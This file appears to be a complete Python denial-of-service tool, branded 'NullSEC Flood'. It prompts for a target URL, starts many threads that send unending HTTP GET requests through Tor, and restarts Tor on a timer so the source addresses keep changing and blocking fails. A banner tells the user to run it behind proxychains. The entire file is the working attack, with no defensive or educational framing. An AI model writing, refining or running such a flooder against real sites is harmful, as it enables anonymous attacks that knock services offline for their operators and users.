import time
import requests
import os
import threading
import subprocess
import multiprocessing
from requests.exceptions import ConnectionError

def restart_tor():
    try:
        with open(os.devnull, 'w') as devnull:
            subprocess.call(["sudo", "service", "tor", "restart"], stdout=devnull, stderr=devnull)
        time.sleep(5)
        print("[+] TOR daemon restarted")
        #time.sleep(15)
    except KeyboardInterrupt:
        print('\nDamn imagine not hitting skids loggers off ')
        quit()

def send_request(url, user_agent):
    # create threads to send requests
    num_threads = int(input("Input the number of threads: "))
    restart_time = int(input("How many seconds between TOR restart: "))
    threads = []
    for i in range(num_threads):
        try:
            t = threading.Thread(target=send_request_thread, args=(url, user_agent))
            threads.append(t)
            t.start()
        except KeyboardInterrupt:
            print('\nDamn imagine not hitting skids loggers off ')
            quit()

    last_restart_time = time.time()
    while True:
        try:
            if time.time() - last_restart_time >= restart_time: # restart TOR daemon every number of seconds depending on user input
                restart_tor()
                last_restart_time = time.time()
            r = requests.get(url, headers={'User-Agent': user_agent},
                            proxies={"socks5": "127.0.0.1:9050"})
            time.sleep(0.1)
            print("[+] Request sent")
        except ConnectionError:
            restart_tor()
        except KeyboardInterrupt:
            print('\nDamn imagine not hitting skids loggers off ')
            quit()

    for t in threads:
        t.join()

def send_request_thread(url, user_agent):
    while True:
        try:
            r = requests.get(url, headers={'User-Agent': user_agent},
                            proxies={"socks5": "127.0.0.1:9050"})
            time.sleep(0.1)
            print("[+] Request sent")
        except ConnectionError:
            restart_tor()
        except KeyboardInterrupt:
            print('\nDamn imagine not hitting skids loggers off ')
            quit()

def run():
    try:
        
        print("""
                     _   _       _ _  _____ ______ _____   ______ _                 _ 
                    | \ | |     | | |/ ____|  ____/ ____| |  ____| |               | |
                    |  \| |_   _| | | (___ | |__ | |      | |__  | | ___   ___   __| |
                    | . ` | | | | | |\___ \|  __|| |      |  __| | |/ _ \ / _ \ / _` |
                    | |\  | |_| | | |____) | |___| |____  | |    | | (_) | (_) | (_| |
                    |_| \_|\__,_|_|_|_____/|______\_____| |_|    |_|\___/ \___/ \__,_|
                                                                                    
                    ------------------ Made by NullSEC. Fuck skids --------------------
                    run this command: proxychains -q python3 <spam name>.py
                    
                

                """)
        url = input('URL: ')
        user_agent = input('User-Agent string: ')
        send_request(url, user_agent)
    except KeyboardInterrupt:
        print('\nDamn imagine not hitting skids loggers off ')
        quit()

if __name__ == '__main__':
    os.system("sudo service tor start")
    run()
